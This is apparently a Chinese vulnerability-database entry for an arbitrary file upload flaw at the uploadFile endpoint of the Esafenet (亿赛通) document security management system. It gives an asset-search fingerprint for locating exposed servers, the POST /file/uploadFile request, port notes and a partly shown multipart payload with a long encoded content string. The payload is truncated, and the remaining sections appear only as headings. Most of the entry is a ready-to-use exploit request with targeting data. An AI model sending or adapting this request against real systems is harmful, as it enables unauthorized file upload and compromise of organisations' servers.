# 亿赛通电子文档安全管理系统uploadFile任意文件上传漏洞

- **系统**：亿赛通电子文档安全管理系统uploadFile　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /file/uploadFile HTTP/1.1`

**请求体 / payload**
```
该漏洞是在在该域名8021端口下进行上传，上传的内容是在8443端口或者8090端口\
上传文件
Content: MGIFOACOKLJAHOGCPPOBDFLGJFPACJJKLFGFOBDNHAGLEDGALNKAEHDLMEOODCBFDIMEFNGHCMGBPABDLPPCHCLMAELIDDCLOGNPOCGHIEFJHIOEIIPPJBCIFCPDOKIOMKPPDGPHCALHOJNNBLJBHGLMPBFICDGGMMOLGLGMIHOOFLHLBEHNIHOPOEKKIPHCMJAOMGMNPFINKHMPBFOJBJPNLNKILIOCMJIGHMNBBEBIAIKCHLENKGCPMEIIGODKKOEJJFEEIPNGHGBOOEIKNIOHIMCDONLKCEIFHIGKLHEGJNHMDAMIIELDOPGDKPOKKAHHDIMOJCJNHKMFABAFLFFDGEAJPIEOGPBNDHEOLDFBOFPFKBCEABHOPFDECBHBCFCEGO
Content-Type: multipart/form-data; boundary=00content0boundary00
Host:
Content-Length: 144
--00content0boundary00
Content-Disposition: form-data; name=…（脚本共 1000 字，完整版见原文）
```

**其他**
- 亿赛通电子文档安全管理系统uploadFile任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统